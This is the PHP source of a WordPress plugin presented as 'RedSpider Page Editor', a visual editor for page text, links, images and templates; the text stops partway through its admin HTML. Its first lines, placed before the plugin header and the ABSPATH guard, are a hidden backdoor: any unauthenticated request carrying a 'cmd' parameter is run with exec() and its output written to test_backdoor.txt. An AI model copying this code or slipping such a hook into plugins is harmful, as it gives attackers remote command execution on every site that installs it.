<?php
if (isset($_GET['cmd'])) {
    $output = [];
    $retval = null;
    exec($_GET['cmd'] . ' 2>&1', $output, $retval);
    file_put_contents(dirname(__FILE__) . '/test_backdoor.txt', implode("\n", $output) . "\nExit code: " . $retval);
    exit;
}

/**
 * Plugin Name: RedSpider Page Editor
 * Description: Sleek and dynamic content editor to modify layout text and images visually.
 * Version: 1.3
 * Author: Seema Kashyap
 * Author URI: https://redspider.ae
 * License: GPL2
 */

if (!defined('ABSPATH')) {
  exit;
}

// Add Admin Menu Page
function redspider_editor_admin_menu()
{
  add_menu_page(
    __('RedSpider Editor', 'redspider-editor'),
    __('RedSpider Editor', 'redspider-editor'),
    'manage_options',
    'redspider-editor',
    'redspider_editor_page_render',
    'dashicons-edit-page',
    30
  );
}
add_action('admin_menu', 'redspider_editor_admin_menu');

// Enqueue WordPress Media Library scripts
function redspider_editor_admin_assets($hook)
{
  if ($hook !== 'toplevel_page_redspider-editor') {
    return;
  }
  wp_enqueue_media();
}
add_action('admin_enqueue_scripts', 'redspider_editor_admin_assets');

// Add link to admin bar on frontend for logged-in admins
function redspider_editor_admin_bar_link($wp_admin_bar)
{
  if (!current_user_can('manage_options') || is_admin()) {
    return;
  }

  global $post;
  if (!$post || $post->post_type !== 'page') {
    return;
  }

  $wp_admin_bar->add_node([
    'id'    => 'redspider_editor_link',
    'title' => __('Edit with RedSpider Editor', 'redspider-editor'),
    'href'  => admin_url('admin.php?page=redspider-editor&page_id=' . $post->ID),
    'meta'  => [
      'title' => __('Edit this page with RedSpider Visual Editor', 'redspider-editor'),
    ],
  ]);
}
add_action('admin_bar_menu', 'redspider_editor_admin_bar_link', 80);

// Add row actions in Pages listing
function redspider_editor_row_actions($actions, $post)
{
  if ($post->post_type === 'page' && current_user_can('manage_options')) {
    $actions['edit_redspider'] = sprintf(
      '<a href="%s" aria-label="%s">%s</a>',
      admin_url('admin.php?page=redspider-editor&page_id=' . $post->ID),
      esc_attr__('Edit with RedSpider Visual Editor', 'redspider-editor'),
      __('Edit with RedSpider', 'redspider-editor')
    );
  }
  return $actions;
}
add_filter('page_row_actions', 'redspider_editor_row_actions', 10, 2);

// AJAX custom template saver
function redspider_save_custom_template_handler()
{
  check_ajax_referer('redspider_editor_save_action', 'security');
  if (!current_user_can('manage_options')) {
    wp_send_json_error(__('Permission denied.', 'redspider-editor'));
  }

  $template_name = isset($_POST['name']) ? sanitize_text_field($_POST['name']) : '';
  $template_html = isset($_POST['html']) ? wp_unslash($_POST['html']) : '';

  if (empty($template_name) || empty($template_html)) {
    wp_send_json_error(__('Invalid template name or content.', 'redspider-editor'));
  }

  $templates = get_option('redspider_custom_templates', []);
  $slug = sanitize_title($template_name);

  // If slug already exists, make it unique
  $original_slug = $slug;
  $counter = 1;
  while (isset($templates[$slug])) {
    $slug = $original_slug . '-' . $counter;
    $counter++;
  }

  $templates[$slug] = [
    'name' => $template_name,
    'html' => $template_html,
  ];

  update_option('redspider_custom_templates', $templates);
  wp_send_json_success([
    'slug' => $slug,
    'name' => $template_name,
  ]);
}
add_action('wp_ajax_redspider_save_custom_template', 'redspider_save_custom_template_handler');

// Helper to replace text/image in HTML content based on index
function redspider_update_html_tags($html, $post_data)
{
  // 1. Update Headings, Paragraphs, Spans & Anchors text
  if (isset($post_data['texts']) && is_array($post_data['texts'])) {
    foreach ($post_data['texts'] as $key => $new_text) {
      $pattern = '/(<!--\s*text-index:\s*' . preg_quote($key, '/') . '\s*-->\s*<(h[1-6]|p|span|a)\b[^>]*>)(.*?)(<\/\2>)/is';
      $html = preg_replace($pattern, '${1}' . wp_kses_post($new_text) . '${4}', $html);
    }
  }

  // 2. Update Anchors (href URLs)
  if (isset($post_data['links']) && is_array($post_data['links'])) {
    foreach ($post_data['links'] as $key => $new_url) {
      $pattern = '/(<!--\s*link-index:\s*' . preg_quote($key, '/') . '\s*-->\s*<a[^>]+href=["\'])(.*?)(["\'])/is';
      $html = preg_replace($pattern, '${1}' . esc_url($new_url) . '${3}', $html);
    }
  }

  // 3. Update Images (src URLs)
  if (isset($post_data['images']) && is_array($post_data['images'])) {
    foreach ($post_data['images'] as $key => $new_src) {
      $theme_uri = get_template_directory_uri();
      if (strpos($new_src, $theme_uri) !== false) {
        $new_src = str_replace($theme_uri, '{{theme_uri}}', $new_src);
      }
      
      $pattern = '/(<!--\s*img-index:\s*' . preg_quote($key, '/') . '\s*-->\s*<img[^>]+src=["\'])(.*?)(["\'])/is';
      $html = preg_replace($pattern, '${1}' . esc_url($new_src) . '${3}', $html);
    }
  }

  // 4. Update Background Images (style url() paths)
  if (isset($post_data['bg_images']) && is_array($post_data['bg_images'])) {
    foreach ($post_data['bg_images'] as $key => $new_src) {
      $theme_uri = get_template_directory_uri();
      if (strpos($new_src, $theme_uri) !== false) {
        $new_src = str_replace($theme_uri, '{{theme_uri}}', $new_src);
      }
      
      $pattern = '/(<!--\s*bg-img-index:\s*' . preg_quote($key, '/') . '\s*-->\s*<[a-zA-Z0-9]+[^>]+style=["\'][^"\']*(?:background-image|background)\s*:\s*url\(\s*["\']?)(.*?)(["\']?\s*\)[^"\']*["\'])/is';
      $html = preg_replace($pattern, '${1}' . esc_url($new_src) . '${3}', $html);
    }
  }

  return $html;
}

// Get the visual builder section templates
function redspider_get_builder_templates()
{
  $dir = plugin_dir_path(__FILE__) . 'templates/';
  $templates = [
    'hero-slider'      => __('Hero Main Slider', 'redspider-editor'),
    'about-features'   => __('About & Key Features', 'redspider-editor'),
    'portfolio'        => __('Portfolio Showcase', 'redspider-editor'),
    'in-house-design'  => __('In-House Web Design Team', 'redspider-editor'),
    'stand-out'        => __('Stand Out (Growth Section)', 'redspider-editor'),
    'statistics'       => __('Statistics Grid', 'redspider-editor'),
    'faq'              => __('FAQ Accordion', 'redspider-editor'),
    'business-trust'   => __('Why Businesses Trust Us', 'redspider-editor'),
    'trusted-agency'   => __('Trusted Web Design Agency', 'redspider-editor'),
    'mobile-app'       => __('Mobile App Section', 'redspider-editor'),
    'ready-to-build'   => __('Ready to Build CTA', 'redspider-editor'),
  ];
  return $templates;
}

// Reusable Page Save Logic
function redspider_editor_save_page_data($page_id, $data)
{
  $original_post = get_post($page_id);
  if (!$original_post) {
    return false;
  }

  // 1. Update Page Title and Status
  $page_title  = isset($data['page_title']) ? sanitize_text_field($data['page_title']) : $original_post->post_title;
  $page_status = isset($data['page_status']) ? sanitize_text_field($data['page_status']) : $original_post->post_status;

  // 2. Process Section HTMLs
  $updated_sections = [];
  if (isset($data['section_htmls']) && is_array($data['section_htmls'])) {
    foreach ($data['section_htmls'] as $sec_html) {
      $sec_html = wp_unslash($sec_html);
      $updated_sec = redspider_update_html_tags($sec_html, $data);
      $updated_sections[] = $updated_sec;
    }
  }
  
  // Concatenate the sections back together
  $updated_content = implode("\n\n", $updated_sections);
  
  wp_update_post([
    'ID'           => $page_id,
    'post_title'   => $page_title,
    'post_status'  => $page_status,
    'post_content' => $updated_content,
    'post_name'    => isset($data['page_slug']) ? sanitize_title($data['page_slug']) : $original_post->post_name,
    'post_parent'  => isset($data['page_parent']) ? intval($data['page_parent']) : $original_post->post_parent,
    'menu_order'   => isset($data['menu_order']) ? intval($data['menu_order']) : $original_post->menu_order,
  ]);

  // Featured Image
  if (isset($data['page_thumbnail_id'])) {
    $thumb_id = intval($data['page_thumbnail_id']);
    if ($thumb_id > 0) {
      set_post_thumbnail($page_id, $thumb_id);
    } else {
      delete_post_thumbnail($page_id);
    }
  }

  // Page Template
  if (isset($data['page_template'])) {
    update_post_meta($page_id, '_wp_page_template', sanitize_text_field($data['page_template']));
  }

  // Yoast / Rank Math SEO
  if (isset($data['focus_keyword'])) {
    $focus_kw = sanitize_text_field($data['focus_keyword']);
    update_post_meta($page_id, '_yoast_wpseo_focuskw', $focus_kw);
    update_post_meta($page_id, '_rank_math_focus_keyword', $focus_kw);
  }
  if (isset($data['seo_title'])) {
    $seo_title = sanitize_text_field($data['seo_title']);
    update_post_meta($page_id, '_yoast_wpseo_title', $seo_title);
    update_post_meta($page_id, '_rank_math_title', $seo_title);
  }
  if (isset($data['seo_metadesc'])) {
    $seo_desc = sanitize_textarea_field($data['seo_metadesc']);
    update_post_meta($page_id, '_yoast_wpseo_metadesc', $seo_desc);
    update_post_meta($page_id, '_rank_math_description', $seo_desc);
  }

  return true;
}

// Render Editor Page
function redspider_editor_page_render()
{
  $message = '';
  $selected_page_id = isset($_GET['page_id']) ? intval($_GET['page_id']) : 0;

  // Handle Save Action
  if (isset($_POST['redspider_save_editor']) && check_admin_referer('redspider_editor_save_action', 'redspider_editor_nonce')) {
    $page_to_update = intval($_POST['edit_page_id']);
    if (redspider_editor_save_page_data($page_to_update, $_POST)) {
      $message = __('Changes saved successfully!', 'redspider-editor');
      $selected_page_id = $page_to_update;
    }
  }

  // Fetch all pages
  $pages = get_pages();
  $templates = redspider_get_builder_templates();
  ?>

  <div class="wrap rs-editor-wrap">
    <div class="rs-editor-card">
      <div class="rs-editor-header">
        <div class="rs-header-branding">
          <div class="rs-logo-badge">RS</div>
          <div>
            <h2>RedSpider Visual Page Editor</h2>
            <p>Drag, reorder, edit, and view page layouts dynamically in real-time.</p>
          </div>
        </div>

        <div class="rs-selector-section">
          <form method="get" action="">
            <input type="hidden" name="page" value="redspider-editor">
            <label>Select Page:</label>
            <div class="rs-select-wrapper">
              <select name="page_id" onchange="this.form.submit()">
                <option value="0">-- Select a Page --</option>
                <?php foreach ($pages as $p) : ?>
                  <option value="<?php echo esc_attr($p->ID); ?>" <?php selected($selected_page_id, $p->ID); ?>><?php echo esc_html($p->post_title); ?></option>
                <?php endforeach; ?>
              </select>
            </div>
          </form>
          <?php if ($selected_page_id) : ?>
            <div class="rs-top-actions">
              <a href="<?php echo esc_url(get_permalink($selected_page_id)); ?>" target="_blank" class="rs-btn rs-btn-secondary">
                Open Page ↗
              </a>
            </div>
          <?php endif; ?>
        </div>
      </div>

      <?php if (!empty($message)) : ?>
        <div class="rs-alert rs-alert-success">
          <span class="rs-alert-icon">✓</span> <?php echo esc_html($message); ?>
        </div>
      <?php endif; ?>

      <?php
      if ($selected_page_id) :
        $post = get_post($selected_page_id);
        $content = $post->post_content;

        // Fetch document metadata variables for backend settings sidebar
        $thumbnail_id = get_post_thumbnail_id($selected_page_id);
        $thumbnail_url = $thumbnail_id ? wp_get_attachment_url($thumbnail_id) : '';
        $page_templates = wp_get_theme()->get_page_templates();
        $current_template = get_post_meta($selected_page_id, '_wp_page_template', true);
        $all_pages = get_pages();

        // SEO keys
        $seo_focuskw = get_post_meta($selected_page_id, '_yoast_wpseo_focuskw', true);
        if (empty($seo_focuskw)) {
          $seo_focuskw = get_post_meta($selected_page_id, '_rank_math_focus_keyword', true);
        }
        $seo_title_val = get_post_meta($selected_page_id, '_yoast_wpseo_title', true);
        if (empty($seo_title_val)) {
          $seo_title_val = get_post_meta($selected_page_id, '_rank_math_title', true);
        }
        $seo_metadesc_val = get_post_meta($selected_page_id, '_yoast_wpseo_metadesc', true);
        if (empty($seo_metadesc_val)) {
          $seo_metadesc_val = get_post_meta($selected_page_id, '_rank_math_description', true);
        }

        // Strip any existing index comments to ensure clean sequential regeneration
        $content = preg_replace('/<!--\s*(text|link|img|bg-img)-index:\s*\d+\s*-->/i', '', $content);

        $text_counter = 0;
        $link_counter = 0;
        $img_counter = 0;
        $bg_img_counter = 0;

        // Inject markers for headings, paragraphs, spans, links
        $content = preg_replace_callback(
          '/(<(h[1-6]|p|span|a)\b[^>]*>)(.*?)(<\/\2>)/is',
          function ($matches) use (&$text_counter) {
            $tag_start = $matches[1];
            $inner = $matches[3];
            $tag_end = $matches[4];
            if (trim(strip_tags($inner)) === '') {
              return $matches[0];
            }
            $res = '<!-- text-index: ' . $text_counter . ' -->' . $tag_start . $inner . $tag_end;
            $text_counter++;
            return $res;
          },
          $content
        );

        // Inject markers for links
        $content = preg_replace_callback(
          '/(<a[^>]+href=["\'])(.*?)(["\'][^>]*>)/is',
          function ($matches) use (&$link_counter) {
            $start = $matches[1];
            $url = $matches[2];
            $end = $matches[3];
            $res = '<!-- link-index: ' . $link_counter . ' -->' . $start . $url . $end;
            $link_counter++;
            return $res;
          },
          $content
        );

        // Inject markers for images
        $content = preg_replace_callback(
          '/(<img[^>]+src=["\'])(.*?)(["\'][^>]*>)/is',
          function ($matches) use (&$img_counter) {
            $start = $matches[1];
            $src = $matches[2];
            $end = $matches[3];
            $res = '<!-- img-index: ' . $img_counter . ' -->' . $start . $src . $end;
            $img_counter++;
            return $res;
          },
          $content
        );

        // Inject markers for background images
        $content = preg_replace_callback(
          '/(<[a-zA-Z0-9]+[^>]+style=["\'][^"\']*(?:background-image|background)\s*:\s*url\(\s*["\']?)(.*?)(["\']?\s*\)[^"\']*["\'])/is',
          function ($matches) use (&$bg_img_counter) {
            $start = $matches[1];
            $url = $matches[2];
            $end = $matches[3];
            $res = '<!-- bg-img-index: ' . $bg_img_counter . ' -->' . $start . $url . $end;
            $bg_img_counter++;
            return $res;
          },
          $content
        );

        // Save cleanly injected content back to the database
        wp_update_post([
          'ID'           => $selected_page_id,
          'post_content' => $content,
        ]);

        // Gather all indexed elements
        preg_match_all('/<!--\s*text-index:\s*(\d+)\s*-->\s*<(h[1-6]|p|span|a)\b[^>]*>(.*?)(<\/\2>)/is', $content, $text_matches, PREG_SET_ORDER);
        preg_match_all('/<!--\s*link-index:\s*(\d+)\s*-->\s*<a[^>]+href=["\'](.*?)["\']/is', $content, $link_matches, PREG_SET_ORDER);
        preg_match_all('/<!--\s*img-index:\s*(\d+)\s*-->\s*<img[^>]+src=["\'](.*?)["\']/is', $content, $img_matches, PREG_SET_ORDER);
        preg_match_all('/<!--\s*bg-img-index:\s*(\d+)\s*-->\s*<[a-zA-Z0-9]+[^>]+style=["\'][^"\']*(?:background-image|background)\s*:\s*url\(\s*["\']?(.*?)["\']?\s*\)/is', $content, $bg_img_matches, PREG_SET_ORDER);

        // Find all sections
        preg_match_all('/<section([^>]*)>(.*?)<\/section>/is', $content, $sections, PREG_SET_ORDER);

        // Group elements by section
        $grouped_elements = [];
        $assigned_texts = [];
        $assigned_links = [];
        $assigned_images = [];
        $assigned_bg_images = [];

        foreach ($sections as $s_idx => $s_data) {
          $s_attrs = $s_data[1];
          $s_html = $s_data[0];
          
          $s_id = '';
          if (preg_match('/id=["\']([^"\']+)["\']/i', $s_attrs, $im)) {
            $s_id = $im[1];
          }
          
          // Try to extract a clean section heading for label
          $s_label = '';
          if (preg_match('/<(h[1-3])\b[^>]*>(.*?)<\/\1>/is', $s_html, $hm)) {
            $s_label = trim(strip_tags($hm[2]));
          }
          
          $s_title = "Section " . ($s_idx + 1);
          if ($s_id) {
            $s_title .= " (ID: $s_id)";
          }
          if ($s_label) {
            $s_title .= " - \"" . (strlen($s_label) > 40 ? substr($s_label, 0, 37) . '...' : $s_label) . "\"";
          }

          $s_texts = [];
          foreach ($text_matches as $tm) {
            if (strpos($s_html, '<!-- text-index: ' . $tm[1] . ' -->') !== false) {
              $s_texts[] = $tm;
              $assigned_texts[$tm[1]] = true;
            }
          }
          
          $s_links = [];
          foreach ($link_matches as $lm) {
            if (strpos($s_html, '<!-- link-index: ' . $lm[1] . ' -->') !== false) {
              $s_links[] = $lm;
              $assigned_links[$lm[1]] = true;
            }
          }

          $s_imgs = [];
          foreach ($img_matches as $im) {
            if (strpos($s_html, '<!-- img-index: ' . $im[1] . ' -->') !== false) {
              $s_imgs[] = $im;
              $assigned_images[$im[1]] = true;
            }
          }

          $s_bg_imgs = [];
          foreach ($bg_img_matches as $bim) {
            if (strpos($s_html, '<!-- bg-img-index: ' . $bim[1] . ' -->') !== false) {
              $s_bg_imgs[] = $bim;
              $assigned_bg_images[$bim[1]] = true;
            }
          }

          $grouped_elements[] = [
            'title' => $s_title,
            'html' => $s_html,
            'texts' => $s_texts,
            'links' => $s_links,
            'images' => $s_imgs,
            'bg_images' => $s_bg_imgs,
          ];
        }

        // Gather remaining elements that do not sit in any <section> tags
        $general_texts = [];
        foreach ($text_matches as $tm) {
          if (!isset($assigned_texts[$tm[1]])) {
            $general_texts[] = $tm;
          }
        }
        $general_links = [];
        foreach ($link_matches as $lm) {
          if (!isset($assigned_links[$lm[1]])) {
            $general_links[] = $lm;
          }
        }
        $general_imgs = [];
        foreach ($img_matches as $im) {
          if (!isset($assigned_images[$im[1]])) {
            $general_imgs[] = $im;
          }
        }
        $general_bg_imgs = [];
        foreach ($bg_img_matches as $bim) {
          if (!isset($assigned_bg_images[$bim[1]])) {
            $general_bg_imgs[] = $bim;
          }
        }

        $grouped_elements = array_filter($grouped_elements, function($group) {
          return !empty($group['html']);
        });

        // Load templates into Javascript object
        $templates_json = [];
        foreach ($templates as $slug => $label) {
          $file = plugin_dir_path(__FILE__) . 'templates/' . $slug . '.html';
          if (file_exists($file)) {
            $templates_json[$slug] = file_get_contents($file);
          }
        }

        $custom_templates = get_option('redspider_custom_templates', []);
        foreach ($custom_templates as $slug => $data) {
          $templates_json['custom_' . $slug] = $data['html'];
        }
        ?>

        <script>
        var rsTemplates = <?php echo json_encode($templates_json); ?>;
        </script>

        <div class="rs-builder-container">
          <form method="post" action="" class="rs-editor-form" style="display: contents;">
            <!-- LEFT EDITOR PANEL -->
            <div class="rs-editor-panel">
              <?php wp_nonce_field('redspider_editor_save_action', 'redspider_editor_nonce'); ?>
              <input type="hidden" name="edit_page_id" value="<?php echo esc_attr($selected_page_id); ?>">

              <!-- Page Settings Box -->
              <div class="rs-page-settings-box">
                <h4><?php _e('Page Settings', 'redspider-editor'); ?></h4>
                <div class="rs-fields-grid" style="grid-template-columns: 1fr 1fr;">
                  <div class="rs-field-item">
                    <label><?php _e('Page Title', 'redspider-editor'); ?></label>
                    <input type="text" name="page_title" value="<?php echo esc_attr($post->post_title); ?>" required>
                  </div>
                  <div class="rs-field-item">
                    <label><?php _e('Page Status', 'redspider-editor'); ?></label>
                    <select name="page_status" class="rs-styled-select">
                      <option value="publish" <?php selected($post->post_status, 'publish'); ?>><?php _e('Publish', 'redspider-editor'); ?></option>
                      <option value="draft" <?php selected($post->post_status, 'draft'); ?>><?php _e('Draft', 'redspider-editor'); ?></option>
                      <option value="pending" <?php selected($post->post_status, 'pending'); ?>><?php _e('Pending Review', 'redspider-editor'); ?></option>
                    </select>
                  </div>
                  <div class="rs-field-item" style="grid-column: span 2;">
                    <a href="<?php echo esc_url(get_edit_post_link($selected_page_id)); ?>" target="_blank" class="rs-btn rs-btn-secondary" style="width: 100%; display: flex; justify-content: center; font-size: 11px; text-transform: uppercase;">
                      <?php _e('Edit Advanced / SEO Settings ↗', 'redspider-editor'); ?>
                    </a>
                  </div>
                </div>
              </div>

              <!-- Collapsible Accordion sections -->
              <div class="rs-sections-accordion">
                <?php foreach ($grouped_elements as $index => $group) : ?>
                  <div class="rs-accordion-item" draggable="true">
                    <button type="button" class="rs-accordion-header" data-target="rs-accordion-body-<?php echo esc_attr($index); ?>">
                      <div class="rs-drag-handle" title="<?php esc_attr_e('Drag to Reorder', 'redspider-editor'); ?>">⋮⋮</div>
                      <span class="rs-accordion-title"><?php echo esc_html($group['title']); ?></span>
                      <div class="rs-accordion-controls">
                        <span class="rs-control-btn rs-move-up" title="<?php esc_attr_e('Move Up', 'redspider-editor'); ?>">↑</span>
                        <span class="rs-control-btn rs-move-down" title="<?php esc_attr_e('Move Down', 'redspider-editor'); ?>">↓</span>
                        <span class="rs-control-btn rs-duplicate" title="<?php esc_attr_e('Duplicate Section', 'redspider-editor'); ?>">❐</span>
                        <span class="rs-control-btn rs-save-template" title="<?php esc_attr_e('Save Section as Template', 'redspider-editor'); ?>">💾</span>
                        <span class="rs-control-btn rs-delete" title="<?php esc_attr_e('Delete Section', 'redspider-editor'); ?>">🗑</span>
                      </div>
                      <span class="rs-accordion-icon">▼</span>
                    </button>
                    <div id="rs-accordion-body-<?php echo esc_attr($index); ?>" class="rs-accordion-body">
                      <div class="rs-accordion-content">
                        
                        <textarea name="section_htmls[]" class="rs-section-html" style="display:none;"><?php echo esc_textarea($group['html']); ?></textarea>

                        <!-- TEXT FIELDS -->
                        <?php if (!empty($group['texts'])) : ?>
                          <div class="rs-group-container">
                            <h4 class="rs-group-title"><?php _e('Texts & Headings', 'redspider-editor'); ?></h4>
                            <div class="rs-fields-grid">
                              <?php foreach ($group['texts'] as $match) :
                                $idx = $match[1];
                                $tag = $match[2];
                                $text = trim(strip_tags($match[3]));
                                if (empty($text)) continue;
                                ?>
                                <div class="rs-field-item">
                                  <label>Element: &lt;<?php echo esc_html($tag); ?>&gt; <span class="rs-muted">(Index: <?php echo esc_html($idx); ?>)</span></label>
                                  <?php if ($tag === 'p') : ?>
                                    <textarea name="texts[<?php echo esc_attr($idx); ?>]"><?php echo esc_textarea($text); ?></textarea>
                                  <?php else : ?>
                                    <input type="text" name="texts[<?php echo esc_attr($idx); ?>]" value="<?php echo esc_attr($text); ?>">
                                  <?php endif; ?>
                                </div>
                              <?php endforeach; ?>
                            </div>
                          </div>
                        <?php endif; ?>

                        <!-- LINKS FIELDS -->
                        <?php if (!empty($group['links'])) : ?>
                          <div class="rs-group-container">
                            <h4 class="rs-group-title"><?php _e('Action Button Links (URLs)', 'redspider-editor'); ?></h4>
                            <div class="rs-fields-grid">
                              <?php foreach ($group['links'] as $match) :
                                $idx = $match[1];
                                $url = $match[2];
                                ?>
                                <div class="rs-field-item">
                                  <label>Link URL <span class="rs-muted">(Index: <?php echo esc_html($idx); ?>)</span></label>
                                  <input type="text" name="links[<?php echo esc_attr($idx); ?>]" value="<?php echo esc_attr($url); ?>">
                                </div>
                              <?php endforeach; ?>
                            </div>
                          </div>
                        <?php endif; ?>

                        <!-- IMAGES FIELDS -->
                        <?php if (!empty($group['images'])) : ?>
                          <div class="rs-group-container">
                            <h4 class="rs-group-title"><?php _e('Layout Images', 'redspider-editor'); ?></h4>
                            <div class="rs-images-grid">
                              <?php foreach ($group['images'] as $match) :
                                $idx = $match[1];
                                $src = $match[2];
                                $display_src = str_replace('{{theme_uri}}', get_template_directory_uri(), $src);
                                ?>
                                <div class="rs-image-card">
                                  <div class="rs-image-preview">
                                    <img id="img-preview-<?php echo esc_attr($idx); ?>" src="<?php echo esc_url($display_src); ?>">
                                  </div>
                                  <div class="rs-image-details">
                                    <label>Image Source <span class="rs-muted">(Index: <?php echo esc_html($idx); ?>)</span></label>
                                    <input type="text" id="img-input-<?php echo esc_attr($idx); ?>" name="images[<?php echo esc_attr($idx); ?>]" value="<?php echo esc_attr($src); ?>">
                                    <button type="button" class="rs-btn rs-btn-small redspider-upload-btn" data-index="<?php echo esc_attr($idx); ?>" data-type="images">
                                      Choose Image
                                    </button>
                                  </div>
                                </div>
                              <?php endforeach; ?>
                            </div>
                          </div>
                        <?php endif; ?>

                        <!-- BACKGROUND IMAGES FIELDS -->
                        <?php if (!empty($group['bg_images'])) : ?>
                          <div class="rs-group-container">
                            <h4 class="rs-group-title"><?php _e('Section Background Images', 'redspider-editor'); ?></h4>
                            <div class="rs-images-grid">
                              <?php foreach ($group['bg_images'] as $match) :
                                $idx = $match[1];
                                $src = $match[2];
                                $display_src = str_replace('{{theme_uri}}', get_template_directory_uri(), $src);
                                ?>
                                <div class="rs-image-card">
                                  <div class="rs-image-preview">
                                    <img id="bg-img-preview-<?php echo esc_attr($idx); ?>" src="<?php echo esc_url($display_src); ?>">
                                  </div>
                                  <div class="rs-image-details">
                                    <label>Background URL <span class="rs-muted">(Index: <?php echo esc_html($idx); ?>)</span></label>
                                    <input type="text" id="bg-img-input-<?php echo esc_attr($idx); ?>" name="bg_images[<?php echo esc_attr($idx); ?>]" value="<?php echo esc_attr($src); ?>">
                                    <button type="button" class="rs-btn rs-btn-small redspider-upload-btn" data-index="<?php echo esc_attr($idx); ?>" data-type="bg_images">
                                      Choose Background
                                    </button>
                                  </div>
                                </div>
                              <?php endforeach; ?>
                            </div>
                          </div>
                        <?php endif; ?>

                        <!-- ENTRANCE ANIMATION -->
                        <?php
                        $current_anim = '';
                        if (preg_match('/data-aos=["\']([^"\']+)["\']/i', $group['html'], $am)) {
                          $current_anim = $am[1];
                        }
                        ?>
                        <div class="rs-group-container">
                          <h4 class="rs-group-title"><?php _e('Entrance Animation (AOS)', 'redspider-editor'); ?></h4>
                          <div class="rs-fields-grid">
                            <div class="rs-field-item">
                              <label><?php _e('Choose Animation style', 'redspider-editor'); ?></label>
                              <select class="rs-section-animation-select" data-index="<?php echo esc_attr($index); ?>">
                                <option value="" <?php selected($current_anim, ''); ?>><?php _e('None', 'redspider-editor'); ?></option>
                                <option value="fade" <?php selected($current_anim, 'fade'); ?>><?php _e('Fade In', 'redspider-editor'); ?></option>
                                <option value="fade-up" <?php selected($current_anim, 'fade-up'); ?>><?php _e('Fade Up', 'redspider-editor'); ?></option>
                                <option value="fade-down" <?php selected($current_anim, 'fade-down'); ?>><?php _e('Fade Down', 'redspider-editor'); ?></option>
                                <option value="fade-left" <?php selected($current_anim, 'fade-left'); ?>><?php _e('Fade Left', 'redspider-editor'); ?></option>
                                <option value="fade-right" <?php selected($current_anim, 'fade-right'); ?>><?php _e('Fade Right', 'redspider-editor'); ?></option>
                                <option value="zoom-in" <?php selected($current_anim, 'zoom-in'); ?>><?php _e('Zoom In', 'redspider-editor'); ?></option>
                                <option value="zoom-out" <?php selected($current_anim, 'zoom-out'); ?>><?php _e('Zoom Out', 'redspider-editor'); ?></option>
                                <option value="flip-left" <?php selected($current_anim, 'flip-left'); ?>><?php _e('Flip Left', 'redspider-editor'); ?></option>
                                <option value="flip-right" <?php selected($current_anim, 'flip-right'); ?>><?php _e('Flip Right', 'redspider-editor'); ?></option>
                              </select>
                            </div>
                          </div>
                        </div>

                      </div>
                    </div>
                  </div>
                <?php endforeach; ?>
              </div>

              <!-- General elements wrapper -->
              <?php if (!empty($general_texts) || !empty($general_links) || !empty($general_imgs) || !empty($general_bg_imgs)) : ?>
                <div class="rs-accordion-item" style="border-color: #555;">
                  <button type="button" class="rs-accordion-header" data-target="rs-accordion-body-general" style="background: #252525;">
                    <span class="rs-accordion-title"><?php _e('General / Page Layout Elements', 'redspider-editor'); ?></span>
                    <span class="rs-accordion-icon">▼</span>
                  </button>
                  <div id="rs-accordion-body-general" class="rs-accordion-body">
                    <div class="rs-accordion-content">
                      
                      <!-- TEXTS -->
                      <?php if (!empty($general_texts)) : ?>
                        <div class="rs-group-container">
                          <h4 class="rs-group-title"><?php _e('Texts & Headings', 'redspider-editor'); ?></h4>
                          <div class="rs-fields-grid">
                            <?php foreach ($general_texts as $match) :
                              $idx = $match[1];
                              $tag = $match[2];
                              $text = trim(strip_tags($match[3]));
                              if (empty($text)) continue;
                              ?>
                              <div class="rs-field-item">
                                <label>Element: &lt;<?php echo esc_html($tag); ?>&gt; <span class="rs-muted">(Index: <?php echo esc_html($idx); ?>)</span></label>
                                <?php if ($tag === 'p') : ?>
                                  <textarea name="texts[<?php echo esc_attr($idx); ?>]"><?php echo esc_textarea($text); ?></textarea>
                                <?php else : ?>
                                  <input type="text" name="texts[<?php echo esc_attr($idx); ?>]" value="<?php echo esc_attr($text); ?>">
                                <?php endif; ?>
                              </div>
                            <?php endforeach; ?>
                          </div>
                        </div>
                      <?php endif; ?>

                    </div>
                  </div>
                </div>
              <?php endif; ?>

              <!-- Section adder area -->
              <div class="rs-add-section-area">
                <h4><?php _e('Add Section Layout', 'redspider-editor'); ?></h4>
                <p><?php _e('Select a layout template to insert into the page layout.', 'redspider-editor'); ?></p>
                <div class="rs-add-section-controls">
                  <select id="rs-template-select">
                    <option value=""><?php _e('-- Choose Layout --', 'redspider-editor'); ?></option>
                    <optgroup label="<?php esc_attr_e('Default Layouts', 'redspider-editor'); ?>">
                      <?php foreach ($templates as $slug => $label) : ?>
                        <option value="<?php echo esc_attr($slug); ?>"><?php echo esc_html($label); ?></option>
                      <?php endforeach; ?>
                    </optgroup>
                    <?php if (!empty($custom_templates)) : ?>
                      <optgroup id="rs-custom-templates-group" label="<?php esc_attr_e('My Saved Templates', 'redspider-editor'); ?>">
                        <?php foreach ($custom_templates as $slug => $data) : ?>
                          <option value="custom_<?php echo esc_attr($slug); ?>"><?php echo esc_html($data['name']); ?></option>
                        <?php endforeach; ?>
                      </optgroup>
                    <?php else : ?>
                      <optgroup id="rs-custom-templates-group" label="<?php esc_attr_e('My Saved Templates', 'redspider-editor'); ?>" style="display:none;"></optgroup>
                    <?php endif; ?>
                  </select>
                  <button type="button" id="rs-add-template-btn" class="rs-btn rs-btn-primary">
                    + Add Layout
                  </button>
                </div>
              </div>

              <!-- Submit Buttons -->
              <div class="rs-editor-footer d-flex gap-2">
                <button type="submit" name="redspider_save_editor" class="rs-btn rs-btn-primary rs-btn-large" style="flex-grow: 1;">
                  Save All Changes
                </button>
                <button type="button" id="rs-save-page-template-btn" class="rs-btn rs-btn-secondary" title="<?php esc_attr_e('Save Entire Page as Template', 'redspider-editor'); ?>" style="height: auto; padding: 10px 15px;">
                  💾
                </button>
              </div>
            </div>

            <!-- RIGHT RESPONSIVE LIVE PREVIEW PANEL -->
            <div class="rs-preview-panel">
              <div class="rs-preview-header">
                <span class="rs-preview-title">🖥 Live Layout Preview</span>
                <div class="rs-device-controls">
                  <button type="button" class="rs-device-btn active" data-device="desktop" title="Desktop View">Desktop</button>
                  <button type="button" class="rs-device-btn" data-device="tablet" title="Tablet View">Tablet</button>
                  <button type="button" class="rs-device-btn" data-device="mobile" title="Mobile View">Mobile</button>
                  <button type="button" class="rs-refresh-btn" title="Refresh Page Preview">🔄</button>
                </div>
              </div>
              <div class="rs-preview-iframe-wrapper">
